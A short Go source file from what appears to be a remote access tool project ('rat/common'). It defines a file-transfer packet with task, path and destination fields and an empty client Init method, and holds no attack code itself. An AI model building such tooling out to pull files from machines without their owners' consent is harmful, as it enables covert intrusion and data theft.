package main

import "rat/common"

type FilePacket struct {
	Task        common.FileTask `network:"send"`
	Path        string          `network:"send"`
	Destination string          `network:"send"`
}

func (packet FilePacket) Header() common.PacketHeader {
	return common.FileHeader
}

func (packet FilePacket) Init(c *Client) {

}
